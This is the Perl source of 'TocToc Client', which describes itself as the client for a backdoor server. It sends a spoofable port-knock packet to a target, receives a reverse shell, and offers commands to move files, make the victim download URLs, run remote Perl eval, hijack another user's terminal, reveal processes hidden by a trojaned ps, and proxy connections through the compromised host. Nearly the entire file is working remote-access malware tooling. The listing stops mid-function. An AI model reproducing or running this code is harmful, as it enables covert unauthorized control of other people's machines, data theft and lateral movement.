   #!/usr/bin/perl
   # TocToc Client 1.7.01-BETA2
   #
   #     0ldW0lf - oldwolf@atrixteam.net
   #             - old-wolf@zipmail.com
   #             - www.atrix.cjb.net
   #             - www.atrixteam.net
   #
   $SIG{WINCH} = \&winch; # So we gonna know if the
                          # terminal size has changed
   $SIG{INT}   = \&finish;
   $SIG{CHLD}  = sub { wait; };
   use IO::Handle;
   use IO::Socket;
   use IO::Select;
   use Term::ReadKey;
   use Term::ReadLine;
   use Time::HiRes;
   use Getopt::Std;
   use Net::RawIP;

   use strict;

   my %opt;
   my $dest = $ARGV[0];

   @ARGV = @ARGV[1 .. $#ARGV]
     if ($dest =~ /\./);

   getopts("p:s:d:l:f:w:m:h",\%opt);

   my $iflist = ifaddrlist;
   my $found_my_ip;
   my @try_ifaces = ("ppp0", "eth0", "eth1");
   foreach my $iface (@try_ifaces) {
     if (defined($iflist->{$iface})) {
       $found_my_ip = $iflist->{$iface};
       last
     }
   }

   unless ($found_my_ip) {
     # dunno what to do
     map { $found_my_ip = $iflist->{$_} } keys %$iflist;
   }


   # Some defines
   my %PACKET;
   my $dest_port          = $opt{d} || int(rand(65535));
   my $source_port        = $opt{s} || int(rand(65535));
   my $TIMEOUT            = $opt{w} || 10;
   my $protocol           = $opt{p} || "TCP";
   my $my_ip              = $opt{m} || $found_my_ip;
   my $source_ip          = $opt{f} || $my_ip;
   my $lport              = $opt{l};
   my $shell_hist_max     = 45; # you can change that but dont need
   my $prompt             = 'TocToc> ';
   my $VERSION            = '1.7.01-BETA2';
   my %SHELL_HIST;
   my $shell_hist_counter = 1;
   my $menu_act           = 0;
   my $clear              = `clear`;
   my $buffer             = 4096;
   my @protocols          = ('tcp', 'udp', 'icmp');

   if (not defined($dest) or defined($opt{'h'}) or $dest !~ /\./) {
     out("               TocToc Client $VERSION\n\n");
     out("    Atrix Team\n\n");
     out("        0ldW0lf - old-wolf\@zipmail.com\n");
     out("                - oldwolf\@atrixteam.net\n");
     out("                - www.atrixteam.net\n");
     out("                - www.atrix.cjb.net\n\n");
     out(" Usage: $0 <ip/host> [options]\n\n");
     out("     -p    Protocol (ICMP, UDP, TCP) TCP is default\n");
     out("     -d    Destination port\n");
     out("     -f    Source IP\n");
     out("     -s    Source port\n");
     out("     -m    Your IP (use if you are using a gateway or spoofing the source IP)\n");
     out("     -l    Local port to listen\n");
     out("     -w    Max time to wait for the connection. Default 10\n\n");
     out(" * In normal cases none options are needed.\n\n");
     exit 1;
   }


   unless ( grep { $_ eq lc($protocol) } @protocols ) {
     out("Protocol \'$protocol\' not supported!\n");
     out("The supported protocols are ".uc(join(', ', @protocols)).".\n");
     exit(1);
   }
   if (lc($protocol) eq "icmp" and (defined($opt{s}) or defined($opt{d}))) {
     out("You cannot especify ports on protocol ICMP.\n");
     exit(1);
   }

   my $sel = IO::Select->new();
   my $toctoc = Term::ReadLine->new("TocToc Client $VERSION");

   my @term_size = GetTerminalSize(\*STDIN);
   my $sel_transfer = IO::Select->new();
   STDOUT->autoflush(1);

   ############
   #   Help   #
   ############
   my %HELP;
   $HELP{get}{args}         = 2;
   $HELP{get}{about}        = "Get a file from the server.";
   $HELP{get}{help1}        = "This command opens a port to the data transfer.";
   $HELP{get}{help2}        = "Its not allowed to overwrite a file so, its checked";
   $HELP{get}{help3}        = "before the download start.";
   $HELP{get}{sintaxe}      = "get <remote file location> <local file location> [local bind port]";
   $HELP{get}{example}      = "get /dir/other/file /home/my_dir/file";

   $HELP{sysinfo}{args}     = 0;
   $HELP{sysinfo}{about}    = "Show some information about the remote machine system.";

   $HELP{put}{args}         = 2;
   $HELP{put}{about}        = "Send a file to the server.";
   $HELP{put}{help1}        = "This commando works like the 'get' does but it";
   $HELP{put}{help2}        = "send the file instead to get. Type: help get";
   $HELP{put}{sintaxe}      = "put <local file location> <remote file location> [local bind port]";
   $HELP{put}{example}      = "put /home/my_dir/file /dir/other/file";

   # COMMAND OPEN REMOVED
   #$HELP{'open'}{args}      = 2;
   #$HELP{'open'}{about}     = "Use the server to open a connection to other host.";
   #$HELP{'open'}{help1}     = "Its a simple way to make the server connect to a host";
   #$HELP{'open'}{help2}     = "and \"redirect\" the connection to us.";
   #$HELP{'open'}{sintaxe}   = "open <host> <port>";
   #$HELP{'open'}{example}   = "open 127.0.0.1 80";

   # NOW OPEN2 BECAME OPEN
   $HELP{'open'}{args}      = 2;
   #$HELP{'open2'}{about}     = "Works like OPEN but it opens a local port and wait for a client.";
   $HELP{'open'}{about}     = "Listen to a local port which will redirect the connection to the host.";
   $HELP{'open'}{help1}     = "The local port will wait for the server to connect and then wait";
   $HELP{'open'}{help2}     = "for a client, when the client connect the server will connect on";
   $HELP{'open'}{help3}     = "the especifyed host:port and will work like a PROXY.";
   $HELP{'open'}{sintaxe}   = "open <host> <port> [local port]";
   $HELP{'open'}{example}   = "open irc.atrixteam.net 6667";

   $HELP{clear}{args}       = 0;
   $HELP{clear}{about}      = "Clear the TocToc prompt screen.";

   $HELP{pwd}{args}         = 0;
   $HELP{pwd}{about}        = "Show the PERL working directory on the server.";

   $HELP{w}{args}           = 0;
   $HELP{w}{about}          = "Show the logged users in the TocToc and what they are doing.";
   $HELP{w}{help1}          = "This command works like the normal \"w\" but";
   $HELP{w}{help2}          = "with some changes.";

   $HELP{version}{args}     = 0;
   $HELP{version}{about}    = "Asks the server version.";

   $HELP{lag}{args}         = 0;
   $HELP{lag}{about}        = "Messure the lag between you and the server.";
   $HELP{lag}{help1}        = "Show you the time it takes to a packet be sended and";
   $HELP{lag}{help2}        = "received in microseconds.";

   $HELP{hijack}{args}      = 1;
   $HELP{hijack}{about}     = "Hijack an opened tty.";
   $HELP{hijack}{help1}     = "All the typed stuff gonna be written in the terminal";
   $HELP{hijack}{help2}     = "so you can write commands in someone else terminal.";
   $HELP{hijack}{sintaxe}   = "hijack <device>";
   $HELP{hijack}{example}   = "hijack /dev/pts/1";

   $HELP{'eval'}{args}      = 1;
   $HELP{'eval'}{about}     = "Make the server evaluate a string.";
   $HELP{'eval'}{help1}     = "Is not recommended to do that unless you realy know";
   $HELP{'eval'}{help2}     = "what you are doing.";
   $HELP{'eval'}{sintaxe}   = "eval <perl code>";
   $HELP{'eval'}{example}   = "eval kill(9, \$\$);";

   $HELP{download}{args}    = 1;
   $HELP{download}{about}   = "Make the server download a file.";
   $HELP{download}{help1}   = "It downloads a ftp or a http link saving the file";
   $HELP{download}{help2}   = "in the PERL working directory. Type: 'help pwd' and 'help cd'";
   $HELP{download}{sintaxe} = "download <URL> [file localtion]";
   $HELP{download}{example} = "download http://www.atrix.cjb.net/files/TocTocKit-last.tgz";

   $HELP{socklist}{args}    = 0;
   $HELP{socklist}{about}   = "Prints the server socklist.";
   $HELP{socklist}{help1}   = "This command is exactly the socklist program.";
   $HELP{socklist}{help2}   = "It shows infos about the programs using a socket.";
   $HELP{socklist}{help3}   = "The suppoted protocol types are: TCP, UDP and RAW.";
   $HELP{socklist}{sintaxe} = "socklist [protocol]";
   $HELP{socklist}{example} = "socklist tcp";

   $HELP{leval}{args}       = 1;
   $HELP{leval}{about}      = "Make the client evaluate a string.";
   $HELP{leval}{help1}      = "Its exactly like 'eval' command but it is evaluated locally.";
   $HELP{leval}{help2}      = "Type: help eval";
   $HELP{leval}{sintaxe}    = "leval <perl code>";
   $HELP{leval}{example}    = "leval kill(9, \$\$);";

   $HELP{raw}{args}         = 1;
   $HELP{raw}{about}        = "Send protocols messages.";
   $HELP{raw}{help1}        = "RAW can be usefull if the server and the client version";
   $HELP{raw}{help2}        = "are different. It sends its arguments as command.";
   $HELP{raw}{help3}        = "Not now but in the future it can be very usefull...";
   $HELP{raw}{sintaxe}      = "raw <command> [arguments]";
   $HELP{raw}{example}      = "raw socklist tcp";

   $HELP{cd}{args}          = 1;
   $HELP{cd}{about}         = "Change the PERL working directory on the server.";
   $HELP{cd}{sintaxe}       = "cd <directory>";
   $HELP{cd}{example}       = "cd /";

   $HELP{ps}{args}          = 0;
   $HELP{ps}{about}         = "Show remote hidden PIDs.";
   $HELP{ps}{help1}         = "This command execute 'ps ax' on the server and compare";
   $HELP{ps}{help2}         = "the result with the PIDs /proc and show you the hidden";
   $HELP{ps}{help3}         = "PIDs by the trojaned ps.";

   $HELP{shell}{args}       = 0;
   $HELP{shell}{about}      = "Take you back to the shell prompt.";

   $HELP{'exit'}{args}      = 0;
   $HELP{'exit'}{about}     = "Close the connection and exit the program.";

   $HELP{help}{args}        = 0;

   # manualy sorting the commands for help stuff
   my @commands = ("PUT", "GET", "DOWNLOAD", "LAG",
                   "EVAL", "LEVAL",
                   "CD", "PWD", "CLEAR",
                   "SOCKLIST","HIJACK",
                   "PS","W",
   #                "OPEN", "OPEN2",
                   "OPEN",
                   "RAW",
                   "VERSION",
                   "SHELL",
                   "EXIT");


   ###################################
   #  Connecting to backdoor server  #
   ###################################

   unless ($dest =~ /^\d+\.\d+\.\d+\.\d+$/) {
     my $resolve = join('.',unpack('C4',(gethostbyname($dest))[4]));
     unless($resolve) {
       finish("Error: Could not resolve $dest\n");
     }
     $dest = $resolve;
   }

   die("Could not listen on port: $!") unless($lport = TestBindPort($lport));

   ReadMode 2; # turns off echo
   out("Password: ");
   chop(my $password = <STDIN>);

   ReadMode 0; # normal mode

   out("\nListening on port: $lport\n");
   # binding port
   my $bind = IO::Socket::INET->new(Listen=>1, LocalPort =>"$lport" ,Proto => 'tcp', Timeout=>$TIMEOUT) || die "Could not listen on port $lport: $!";

   my $show_dport;
   my $show_sport;
   if (lc($protocol) ne "icmp") {
     $show_dport  = ":$dest_port";
     $show_sport = ":$source_port";
   }
   out("Sending packet [From $source_ip"."$show_sport "."To $dest"."$show_dport Proto: ".uc($protocol)."]\n");
   out("Asking to connect on $my_ip:$lport\n");
   send_packet();

   out("Waiting for the connection...\n");

   # waiting for the conections with timeout of 15s especifyed on the binding ($bind)
   my $sock = $bind->accept();

   finish("Server didn´t connect!\n") unless($sock);

   out("\nOK! We are in.\n");
   out("Menu char: ^H\n\n");
   STDIN->autoflush(1);
   $sel->add(\*STDIN);
   ReadMode 4; # give us control of the typed keys


   $sel->add($bind);
   $sock->autoflush(1);
   $sel->add($sock);
   my $proto_sock;

   ###################
   #  Our main loop  #
   ###################

   while ( 1 ) {

     my @ready = $sel->can_read(0.01);
     foreach my $fh (@ready) {
       my $msg;
       my $nread = sysread($fh, $msg, $buffer);
       if ($fh eq $bind) {
         # the socket which we gonna send/receive the protocols menssages

         $proto_sock = $bind->accept();
         $sel->remove($bind); # we can stop binding
         $bind->close();      #
         spm("TERM_SIZE @term_size") if (defined(@term_size));
       } elsif ($fh eq $sock) {
           if ($nread == 0) {
             finish("\nDesconnected!\n");
           } else {
               write_out($msg);
           }
       } else { # STDIN
           if (ord($msg) == 8) { # ^H
               active_menu();
           } else {
               write_sock($msg);
           }
       }
     }
   }
   ####################
   #       SUBS       #
   ####################

   ###############
   #    MENU     #
   ###############
   sub active_menu {
     $sel->remove(\*STDIN);
     ReadMode 0;
     $menu_act = 1;
     clear();
     menu();
   }

   sub desactive_menu {
     $menu_act = 0;

     $sel->add(\*STDIN);

     ReadMode 4;

     clear();
     show_shell_buff();
     fhread(\*STDIN); # flush STDIN

     alarm(0);
   }

   sub menu {
     $SIG{INT} = \&finish;

     while( defined (my $line = $toctoc->readline($prompt)) ) {
       if (lc($line) eq "shell") {
         desactive_menu();
         return;
       } else {
           parse_cmd($line) if ($line =~ /\S/);
       }
     }
   }


   #####################
   #  TocToc Commands  #
   #####################
   sub parse_cmd {
     my $cmd = shift;

     my (@args, $arg);
     $cmd =~ s/^\s+//;

     if ($cmd =~ /^(.+?)\s+(.*)/) {
       $cmd = lc($1);
       $arg = $2;
       @args = split(/ +/, $arg);
     } else {
        $cmd = lc($cmd);
     }

     unless (defined($HELP{$cmd})) {
       out("$cmd: command not found.\n");
       return(undef);
     }

     if (scalar(@args) < $HELP{$cmd}{args}) {
       HelpCMD($cmd);
       return(undef);
     }

     if ($cmd eq "help") {
       ShowHelp($args[0]);
       return();
     } elsif ($cmd eq "exit") {
        finish("Exiting...\n", $clear."C ya!\n");
     } elsif ($cmd eq "get") {
        get(@args);
     } elsif ($cmd eq "lag") {
        my $time = Time::HiRes::time();
        ask_cmd(uc($cmd), $time);
     } elsif ($cmd eq "put") {
        put(@args);
     } elsif ($cmd eq "hijack") {
        hijack("$arg");
     } elsif ($cmd eq "leval") {
        my $ret = eval "$arg";
        out("Evaluation returned: $ret\n");
   #  } elsif ($cmd eq "open") {
   #     sopen(@args);
   #  } elsif ($cmd eq "open2") {
   #     sopen2(@args);
     } elsif ($cmd eq "open") {
        sopen2(@args);
     } elsif ($cmd eq "raw") {
        my $send_args = $arg;
        $send_args =~ s/^\S+//;
        $send_args =~ s/^\s+//;

        ask_cmd(uc($args[0]), $send_args);
     } elsif ($cmd eq "clear") {
         clear();
     } else {
        ask_cmd(uc($cmd), $arg);
     }
   }

   sub ask_cmd {
      my ($cmd, $arg) = @_;
      unless (defined($proto_sock->peerhost)) {
        out("Error: The protocol connection is not estabilished!\n");
        out("       Try to reconnect.\n");
        return;
      }

      $arg = "0" unless($arg);

      local($SIG{INT}) = sub  {
         spm("$cmd ABORT");
         out("\nOperation aborted!\n\n");
         ShutDownTransfer();
         goto \&menu;
      };

      fhread($proto_sock); # flushing
      spm("$cmd $arg");

      my $res = '';

      while (<$proto_sock>) {
        my $msg = $_;
        my $unparsed = $res.$msg;
        while($unparsed =~ /\001T:(\S+)\s(.+?):\002\n/) {
          my $got_cmd = $1;
          my $got_args = $2;
          $unparsed =~ s/\001T:$got_cmd\s.+?:\002\n//;

          if (lc($got_cmd) ne lc($cmd)) {
            # answer of aborted commands...
            next;
          } elsif (!parse_ans($got_cmd, $got_args)) {
              return(1);
          }
        }
        $res = $unparsed;
      }
   }

   sub parse_ans {
     my ($cmd, $ans) = @_;

     return(undef) if ($ans eq "DONE");
     if ($cmd eq "DOWNLOAD") {
       if ($ans =~ /^\r/) {
         out($ans);
       } else {
          out("$ans\n");
       }
     } elsif ($cmd eq "LAG") {
         my $time = Time::HiRes::time();
         my $lag = $time-$ans;
         out("Lag: $lag microsec\n");
     } else {
         out("$ans\n");
     }
     return(1);
   }

   # This function was removed
   # it has a little bug which do not let you write on the shell
   # after you hit ^C. This function gave me more problems the it
   # could give, so I give up :P
   # It was not a big deal waste my time with it
   #
   # If you tested this command and think that the bug should be fixed mail-me
   #sub sopen {
   #  my @args = @_;
   #
   #  my $sel_open = IO::Select->new($proto_sock);
   #  $sel_open->add(\*STDIN);
   #
   #  local($SIG{INT}) = sub  {
   #     spm("OPEN ABORT");
   #     out("\nOperation aborted!\n\n");
   #     $sel_open->remove(\*STDIN);
   #     $sel_open->remove($proto_sock);
   #
   #     goto \&menu;
   #  };
   #
   #  fhread($proto_sock); # flushing
   #
   #  out("Type ^C to abort.\n");
   #  print "_" x $term_size[0]."\n";
   #  spm("OPEN @args");
   #
   #
   #  my $keep_going = 1;
   #
   #  while ( $keep_going ) {
   #    foreach my $fh ($sel_open->can_read(1)) {
   #      my $buf;
   #      sysread($fh, $buf, $buffer);
   #      if ($fh eq $proto_sock) {
   #        if ($buf =~ /(.*)\003FINISHED-(.*)\002/) {
   #          out($1."\n$2\n");
   #          undef($keep_going);
   #          last;
   #        }
   #        out($buf);
   #      } else {
   #         syswrite($proto_sock, $buf, length($buf));
   #      }
   #    }
   #  }
   #  $sel_open->remove(\*STDIN);
   #  $sel_open->remove($proto_sock);
   #  return(1);
   #}

   sub sopen2 {
     my ($ip, $rport, $localport) = @_;

     my $port = TestBindPort($localport);

     unless ($port) {
       out("Could not listen on port $localport\n");
       return();
     }

     my $open2 = IO::Socket::INET->new(Listen => 1, LocalPort => $port, Proto => "tcp", Timeout => $TIMEOUT);
     unless($open2) {
       out("Freak error binding on port $port\n");
       return();
     }

   #  spm("OPEN2 $ip $rport $port");
     spm("OPEN $ip $rport $port");

     out("Waiting for the server...\n");

     my $open_serv = $open2->accept();
     unless($open_serv) {
       out("Operation timed out! Server didn't connect.\n");
       return();
     }
     out("Server connected.\n");

     my $pid = fork();

     if (not defined($pid)) {
       out("Error on fork()\n");
       return();
     }

     unless ($pid) {
       my $sel = IO::Select->new($open2);
       $sel->add($open_serv);
       $open_serv->autoflush(1);
       my $client;

       while ( 1 ) {
         foreach my $fh ($sel->can_read(0.1)) {
           my $msg;
           my $nread = sysread($fh, $msg, $buffer);
           if ($nread == 0 and $fh ne $open2) {
              $open2->close();
              $client->close()    if ($client);
              $open_serv->close() if ($open_serv);

              $sel->remove();
              undef($sel);
              exit;
           }

           if ($fh eq $open2) {
             $client = $open2->accept();
             $client->autoflush(1);
             $sel->add($client);
             print $open_serv "GO GO GO\n";
           } elsif ($fh eq $open_serv) {
               syswrite($client, $msg, length($msg));
           } elsif ($fh eq $client) {
               syswrite($open_serv, $msg, length($msg));
           }
         }
       }
     }

     out("OK! Running in background.\n");
     out("Local port: $port\n");

   }

   sub hijack {
     my $dev = shift;

     out("Type 'close' to exit.\n");
     print "[$dev]> ";
     while( my $line = <STDIN> ) {

       $line =~ s/\n$//;
       last if (lc($line) eq "close");

       ask_cmd("HIJACK", "$dev $line");
       print "[$dev]> ";

     }
   }


   sub get {
     my ($remote_file, $local_file, $bind_port) = @_;

     if (-e "$local_file" and (stat("$local_file"))[7] > 0) {
       out("File ($local_file) already exist.\n");
       return(undef);
     }

     unless(open(FILE, "> $local_file")) {
       out("Could not open file ($local_file) for writting.\n");
       return(undef);
     }

     return(undef) unless (my $port = TestTransferPort($bind_port));

     return(undef) unless (SetUpTransfer($port, "GET $remote_file $port"));

     my ($msg, $total_bytes, $init_time);
     my $got_info = 0;
     my $cur_byte = 0;

     while ( 1 ) {
       my @ready = $sel_transfer->can_read(1);

       foreach my $fh (@ready) {

         my $nread = sysread($fh, $msg, $buffer);
         if ($nread == 0) {
           ShutDownTransfer("Connection lost!\n");
           close(FILE);
           return(undef);
         }
         if ($fh eq \*STDIN) {
           if (ord($msg) == 3) { # we got a ^C
             close(FILE);
             ShutDownTransfer("\nTransfer: Operation aborted!\n");

             return(undef);
           }
         } else {
           if ($got_info == 0) {
             if ($msg =~ /^(\d+)$/) {
               $total_bytes = $1;
               clear_last();
               out("Stats: Saving file in $local_file ($total_bytes bytes). Type ^C to abort.\n");
               my $pack = pack("N", 0);
               syswrite($fh, $pack, length($pack));
               $init_time = Time::HiRes::time();

             } else {
                 clear_last();
                 ShutDownTransfer("Server said: $msg\n");
                 close(FILE);
                 return(undef);
             }
             $got_info = 1;
           } else {
              my $size = length($msg);
              $cur_byte += $size;
              print FILE $msg;
              my $packbyte = pack("N", $cur_byte);
              syswrite($fh, $packbyte, length($packbyte));

              ProgressBar($init_time, $cur_byte, $total_bytes);

              if ($cur_byte == $total_bytes) {
                ShutDownTransfer("\nTransferation completed! File has been saved.\n");
                close(FILE);
                return(1);
              }
           }
         }
       }
     }
   }

   sub put {
     my ($local_file, $remote_file, $bind_port) = @_;

     unless (-e "$local_file") {
       out("File ($local_file) doesn't exist.\n");
       return(undef);
     }

     unless(open(FILE, "< $local_file")) {
       out("Could not open file ($local_file) for reading.\n");
       return(undef);
     }

     return(undef) unless (my $port = TestTransferPort($bind_port));

     return(undef) unless (SetUpTransfer($port, "PUT $remote_file $port"));

     my $msg;
     my $bytes = (stat("$local_file"))[7];

     my $first_msg = 1;
     my $init_time;
     while ( 1 ) {
       my @ready = $sel_transfer->can_read(1);

       foreach my $fh (@ready) {
         my $nread = sysread($fh, $msg, $buffer);
         if ($nread == 0) {
           ShutDownTransfer("\nConnection lost!\n");
           close(FILE);
           return(undef);
         }
         if ($fh eq \*STDIN) {
           if (ord($msg) == 3) { # we got a ^C
             close(FILE);
             ShutDownTransfer("\nOperation aborted!\n");
             return(undef);
           }
         } else {
             if ($first_msg == 1) {
               $first_msg = 0;
               unless($msg eq "OK") {
                 clear_last();
                 ShutDownTransfer("Server said: $msg\n");
                 close(FILE);
                 return(undef);
               }
               syswrite($fh, $bytes, length($bytes));
               clear_last();
               out("Stats: Sending file $local_file ($bytes bytes)\n");
               $init_time = Time::HiRes::time();
               next;
             }
             my $sended_bytes = unpack("N", $msg);

             ProgressBar($init_time, $sended_bytes, $bytes) unless ($sended_bytes == 0);

             if ($sended_bytes == $bytes) {
                ShutDownTransfer("\nTransferation completed! File has been sended.\n");
                close(FILE);
                return(1);
             }
             my $send_bytes;
             seek(FILE, $sended_bytes, 0);
             read(FILE, $send_bytes, 1024);
             syswrite($fh, $send_bytes, length($send_bytes));

         }
       }
     }
   }

   ##################
   # Transfer Stuff #
   ##################

   sub TestTransferPort {
     my $bind_port = shift;
     my $port = TestBindPort($bind_port);

     unless($port) {
       out("I could not listen on port: $bind_port\n");
       return(undef);
     }
     return($port);
   }

   sub SetUpTransfer {
     my ($port, $spm) = @_;

   #  ShutDownTransfer(); # any non-canceled tranfer?

     my $transfer = IO::Socket::INET->new(Listen => 1, LocalPort => "$port", Proto => "tcp", Timeout => $TIMEOUT);

     unless($transfer) {
       out("Freak error on binding local port: $port\n");
       return(undef);
     }

     spm($spm) if ($spm);

     out("Stats: Waiting for the server...");

     my $remote = $transfer->accept();
     unless ($remote) {
       clear_last();
       out("Stats: Operation timed out! Server didn't connect.\n");
       return(undef);
     }

     clear_last();
     out("Stats: Server connected!");

     my $port;
     $transfer->close;
     $remote->autoflush(1);

     $sel_transfer->add($remote);
     $sel_transfer->add(\*STDIN);
     ReadMode 4;
     return(1);
   }

   sub ShutDownTransfer {
     my $msg = shift;
     foreach my $fh ($sel_transfer->can_write(1)) {
       $sel_transfer->remove($fh);
       unless ($fh eq \*STDIN) {
         $fh->close() if($fh);
       }
     }
     out($msg) if (defined($msg));
     ReadMode 0;
     sleep(1);
     return(1);
   }


   # i like the wget look so i based this function on it :)
   sub ProgressBar {
     my ($init_time, $saved_bytes, $total_bytes) = @_;

     # time  #
     my $d_time = (Time::HiRes::time())-$init_time;

     # size #
     my $unit = "Kb/s";
     my $Sps = ($saved_bytes/$d_time) / 1024;
     if ($Sps > 1024) {
        $Sps = $Sps/1024;
        $unit = "Mb/s";
     }
     $Sps = round($Sps, 2);


     # percentage #
     my $percent = ($saved_bytes*100)/$total_bytes;
     $percent = round($percent, 1);

     # i hope someone teach me a better way :/
     my $s_saved_bytes = reverse($saved_bytes);
     $s_saved_bytes =~ s/(...)/$1,/g;
     $s_saved_bytes = reverse($s_saved_bytes);
     $s_saved_bytes =~ s/^\,//;
     my $s_total_bytes = reverse($total_bytes);
     $s_total_bytes =~ s/(...)/$1,/g;
     $s_total_bytes = reverse($s_total_bytes);
     $s_total_bytes =~ s/^\,//;

     # cauculating ETA #
     my $eta_s = round(($d_time*($total_bytes-$saved_bytes))/$saved_bytes, 0);
     my $eta_h = int($eta_s/3600);
     $eta_s %= 3600;
     my $eta_m = int($eta_s/60);
     $eta_s %= 60;
     $eta_h = "0$eta_h" if (length($eta_h) == 1);
     $eta_m = "0$eta_m" if (length($eta_m) == 1);
     $eta_s = "0$eta_s" if (length($eta_s) == 1);

     # positionating the info on the screen #
     my $show_percent = fill_space($percent, 6);
     my $show_bytes = fill_space($s_saved_bytes, length($s_total_bytes));
     my $show_Sps = fill_space($Sps, 9);
     my $show_eta = fill_space("$eta_h:$eta_m:$eta_s", 9);
     $show_eta = "--:--:--" if (length($show_eta) > 9);

     my $total_chars = length(" $show_percent% [] $show_bytes  $show_Sps$unit  ETA $show_eta");

     # bars #
     my $total_bars = $term_size[0]-5-$total_chars;
     if($total_bars < 10) {
        out("Your terminal size is too small\r");
        return;
     }

     my $bar_per_byte = $total_bars/$total_bytes;
     my $bars_n = $bar_per_byte * $saved_bytes;

     # yeah u know 0.something may do this
     $bars_n = $total_bars if ($saved_bytes == $total_bytes);
     $bars_n-- if ($saved_bytes != $total_bytes and $bars_n == $total_bars);

     my $bars = "=" x $bars_n;
     my $blank_n = $total_bars-$bars_n;
     my $blank = " " x $blank_n;
     $bars =~ s/=$/>/ if ($bars =~ /=/ and $bars_n != $total_bars);
     $blank .= ' ' if ($total_bars != $bars_n);

     my $blank_end = " " x 5;

     out("\r $show_percent% \033[1m"."[$bars$blank]"."\033[0m $show_bytes  $show_Sps$unit  ETA $show_eta$blank_end");

   }

   #############
   #   HELP    #
   #############

   sub HelpCMD {
     my $cmd = shift;

     out("\n\033[1m  - ".uc($cmd)." - \033[0m\n\n");
     out("   \033[1mAbout\033[0m: ".$HELP{$cmd}{about}."\n\n");

     my $first = 1;

     for (my $c = 1; ; $c++) {
       unless(defined($HELP{$cmd}{"help$c"})) {
         out("\n") if ($first != 1);
         last;
       }
       if ($first == 1) {
         out("    \033[1mHelp\033[0m: ".$HELP{$cmd}{"help$c"}."\n");
         $first = 0;
       } else {
          out("          ".$HELP{$cmd}{"help$c"}."\n");
       }
     }
     out(" \033[1mSintaxe\033[0m: ".$HELP{$cmd}{sintaxe}."\n") if defined($HELP{$cmd}{sintaxe});
     out(" \033[1mExample\033[0m: ".$HELP{$cmd}{example}."\n") if defined($HELP{$cmd}{example});
     out("\n") if (defined($HELP{$cmd}{sintaxe}) or defined($HELP{$cmd}{example}));
   }

   sub ShowHelp {
     my $cmd = lc(shift);
     if ($cmd) {
       if ($cmd eq "help") {
          out("No help available for command help.\n");
       } elsif (grep { lc($_) eq $cmd } @commands ) {
           HelpCMD($cmd);
       } else {
           out("Command '$cmd' doesn't exist.\n");
       }
       return();
     }
     out("            \033[1mTocToc Help\033[0m\n\n");
     foreach my $command (@commands) {
       out(" \033[1m".fill_space($command, 10)."\033[0m - ".$HELP{lc($command)}{about}."\n");
     }
     out("\nType: help <command>\n\n");
   }


   #################
   #  Write Stuff  #
   #################

   sub clear {
     out($clear);
   }

   # Send Protocol Message
   # those messages are interpreted instead
   # of to be written on the shell
   sub spm {
     my $cmd = shift;
     check_connection();
     write_sock("\001T:$cmd:\002\n", $proto_sock);
   }

   # write directly to socket
   sub write_sock {
     my $msg = shift;
     my $osock = shift;
     if (defined($osock)) {
       return(syswrite($osock, $msg, length($msg)));
     } else {
        return(syswrite($sock, $msg, length($msg)));
     }
   }

   # the out() sends the args to STDOUT only
   # here we send it to the shell history too
   sub write_out {
     my $msg = shift;
   #  $msg =~ s/\001T:.+?:\002\n//g; # probably answer of aborted commands or a bug
     return() if ($msg eq '');

     write_shell_hist($msg);
     out($msg) if ($menu_act == 0);
   }

   sub out {
     my $msg = join('', @_);
     syswrite(STDOUT, $msg, length($msg));
   }

   sub write_shell_hist {
     my $hist = shift;

     while ($hist =~ /\n/) {
       $hist =~ /^(.*?\n)/;
       my $hist_line = $1;
       $hist =~ s/^.*?\n//;

       $SHELL_HIST{$shell_hist_counter} = '' if (not defined($SHELL_HIST{$shell_hist_counter}));
       $SHELL_HIST{$shell_hist_counter} .= $hist_line;
       $shell_hist_counter++;
     }
     $SHELL_HIST{$shell_hist_counter} = '' if (not defined($SHELL_HIST{$shell_hist_counter}));
     $SHELL_HIST{$shell_hist_counter} .= $hist;


     if ($shell_hist_counter >= $shell_hist_max) {
        my %NEW_HIST;
        for (my $c = $shell_hist_counter; $c > 0; $c--) {
           my $new_c = $c-($shell_hist_counter-$shell_hist_max);
           last if ($new_c <= 0);
           $NEW_HIST{$new_c} = $SHELL_HIST{$c};
        }
        %SHELL_HIST = %NEW_HIST;
        $shell_hist_counter = $shell_hist_max;
     }

   }

   ############
   #  Others  #
   ############

   sub check_connection {
     if (not defined($proto_sock->peerhost) or not defined($sock->peerhost)) {
       finish("\nDesconnected!\n");
     }
     return(1);
   }


   # so we can read without blocking
   sub fhread {
     my $fh = shift;

     my $got_msg = '';
     my $msg;
     while ( my $ready = is_ready($fh)) {
       last if ($ready == 0);
       sysread($fh, $msg, $buffer);
       $got_msg .= $msg;
     }

     return($got_msg);
   }

   sub is_ready {
     my $fh = shift;
     my $read = '';
     vec($read, fileno($fh), 1) = 1;
     my $ready = 0;
     $ready = select($read, undef, undef, 0);
     return($ready);
   }

   sub fill_space {
     my ($chars, $max) = @_;
     my $filled = length($chars);
     my $space_n  = $max-$filled;
     return($chars) if ($space_n <= 0);

     my $space = " " x $space_n;

     return($space.$chars);
   }


   sub round {
     my ($number, $decimals) = @_;

     my ($int,$dec) = split('\.', $number);

     return("$int.".("0" x $decimals)) unless (defined($dec));

     my @dec_ns = split('', $dec);

     return("$int.$dec".("0" x ($decimals-(scalar(@dec_ns)))))
       if (scalar(@dec_ns) < $decimals);

     my $last_on_next = 0;
     for (my $c = $#dec_ns; $c >= 0; $c--) {
       if ($dec_ns[$c] >= 5) {
         if (($c-1) < 0) {
           $int++;
         } else {
            $dec_ns[$c-1]++;
         }
         $dec_ns[$c] = 0;
       }
       last if ($dec_ns[$c-1] != 10 and $last_on_next == 1);
       last if ($c == $decimals and $dec_ns[$c-1] != 10);
       $last_on_next = 1 if ($c < $decimals and $dec_ns[$c-1] != 10);
     }

     my $new_dec = join('', @dec_ns[0 .. ($decimals-1)]);

     my $dot = "." if ($decimals != 0);
     return("$int$dot$new_dec");
   }



   sub clear_last {
     my $spaces = " " x $term_size[0];
     out("\r$spaces\r");
   }


   sub TestBindPort {
     my $port = shift;

     if (defined($port)) {
       my $test = IO::Socket::INET->new(Listen=>1, LocalPort =>"$port",Proto => 'tcp') || return(undef);
       $test->close;
       return($port);
     } else {
         my $test = IO::Socket::INET->new(Listen=>1, Proto => 'tcp');
         my $port = $test->sockport;
         $test->close;
         return($port);
     }
   }


   sub show_shell_buff {
     my $lines = $term_size[1];

     my @screen;
     my $c = $shell_hist_counter-1;
     my $shown_lines = 0;

     push(@screen, $SHELL_HIST{$shell_hist_counter}) if (defined($SHELL_HIST{$shell_hist_counter}));

     while (defined($SHELL_HIST{$c})) {
